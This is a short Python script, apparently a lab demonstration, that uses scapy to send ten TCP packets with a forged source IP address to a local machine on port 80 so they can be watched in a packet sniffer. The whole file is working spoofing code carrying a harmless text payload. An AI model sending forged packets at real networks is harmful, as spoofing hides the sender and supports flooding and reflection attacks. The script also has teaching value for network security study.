

from random import randint
import scapy.all as scapy


def printInfo(keyValueDetails: dict) -> None:
    
    for key in keyValueDetails:
        value = keyValueDetails[key]
        print(f'{key}: {value}')


# This is the IP which we are masking with
# i.e., Spoofed Source IP Address
spoofedSourceIp = "192.168.1.254"

# This is the Destination IP address
# Currently set to the IP of PC from which attack is triggered
destinationIp = "192.168.0.113"

# Source Port Address
sourcePortNo = 430

# Destination Port Address
destinationPortNo = 80

# Sample payload for the packet
payload = "This is sample payload for the spoofed packet"

# Just printing the details of attack
print('IP SPOOFING ATTACK')
printInfo(
    {
        'Source IP Address (spoofed)': spoofedSourceIp,
        'Destination IP Address': destinationIp,
        'Source Port No.': sourcePortNo,
        'Destination Port No.': destinationPortNo,
        'Sample Payload': payload,
    }
)

# Launching the attack
for _ in range(10):
    # Creating the packet with spoofed IP
    spoofed_packet = scapy.IP(src=spoofedSourceIp, dst=destinationIp) / \
        scapy.TCP(sport=sourcePortNo, dport=destinationPortNo) / payload
    # Sending the packet
    scapy.send(spoofed_packet)

    # Now this spoofed packets can be sniffed using Packet Sniffer
    # Packet Sniffer Program will show this packets with Spoofed IP in its output